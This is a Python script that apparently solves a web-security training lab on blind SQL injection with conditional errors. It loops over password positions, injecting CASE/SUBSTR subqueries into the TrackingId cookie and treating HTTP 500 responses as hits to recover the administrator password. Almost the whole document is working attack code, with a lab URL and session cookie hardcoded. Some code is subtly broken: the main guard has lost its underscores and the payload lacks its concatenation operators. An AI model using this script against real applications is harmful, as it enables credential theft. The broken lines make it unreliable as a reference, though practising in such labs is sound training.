"""
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.


Lab: Blind SQL injection with conditional errors

"""

import requests
import string
import time

# Target URL
url = "https://0a2100fe0465a71b802208ad000d0018.web-security-academy.net"  # Replace with your target URL

# Characters to try (lowercase letters and numbers)
chars = string.ascii_lowercase + string.digits

# Session cookie - you'll need to update this with your actual session cookie
session_cookie = "YRoe8HtCUx0p6lfOFOXvUnpOzBPCq61T"

# Password length (based on the document)
password_length = 20

# Function to test each character at each position
def extract_password():
    password = ""
    
    for position in range(1, password_length + 1):
        for char in chars:
            # Payload that causes an error when the character at the current position matches
            payload = f"gATTAEwb6mOPcDKI'(SELECT CASE WHEN SUBSTR(password,{position},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')'" # in the beginning replace your tracking cookie
            
            # Set cookies
            cookies = {
                "TrackingId": payload,
                "session": session_cookie
            }
            
            # Make the request
            try:
                response = requests.get(url, cookies=cookies)
                
                # If we get a 500 error, we found the correct character (the CASE condition was true)
                if response.status_code == 500:
                    password += char
                    print(f"Found character at position {position}: {char}")
                    print(f"Current password: {password}")
                    break
                    
            except requests.RequestException as e:
                print(f"Request error: {e}")
                time.sleep(2)  # Wait a bit before retrying
                
        # If we didn't find a character at this position, something went wrong
        if len(password) < position:
            print(f"Failed to find character at position {position}")
            break
    
    return password

if name == "main":
    print("Starting blind SQL injection password extraction...")
    start_time = time.time()
    
    final_password = extract_password()
    
    elapsed_time = time.time() - start_time
    print(f"\nExtraction completed in {elapsed_time:.2f} seconds")
    print(f"Administrator password: {final_password}")